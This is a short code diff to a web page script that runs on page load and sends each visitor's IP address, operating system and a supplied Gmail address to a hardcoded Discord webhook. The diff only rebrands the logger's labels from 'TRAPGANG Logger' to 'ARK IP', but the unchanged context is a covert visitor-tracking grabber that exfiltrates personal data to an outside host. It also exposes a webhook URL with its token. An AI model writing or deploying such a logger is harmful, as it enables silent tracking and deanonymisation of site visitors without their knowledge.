@@ -10,10 +10,10 @@ window.onload = function () {
           const webhookURL = "https://discord.com/api/webhooks/1362658452266287125/dZIoJad_qKV4tBtOm8YXOU6jcCCGbNCj9ccfsUWwDXc_jGQAI9_I0oVyiVB4QZPaZOFG";
 
           const embedData = {
-              "username": "Visitor Logger",
+              "username": "ARK IP",
               "avatar_url": "https://cdn.discordapp.com/icons/123456789012345678/yourimage.png",
               "embeds": [{
-                  "title": "📌 **New Visitor Logged!**",
+                  "title": "📌 **ARK IP**",
                   "color": 16711680,
                   "fields": [
                       { "name": "🔹 **IP Address**", "value": `\`${ip}\``, "inline": false },
@@ -21,7 +21,7 @@ window.onload = function () {
                       { "name": "💻 **Platform (OS)**", "value": `\`${platform}\``, "inline": false },
                       { "name": "📧 **Gmail**", "value": `\`${email || "Not provided"}\``, "inline": false }
                   ],
-                  "footer": { "text": "🚀 TRAPGANG Logger" }
+                  "footer": { "text": "ARK ON TOP" }
               }]
           };
 
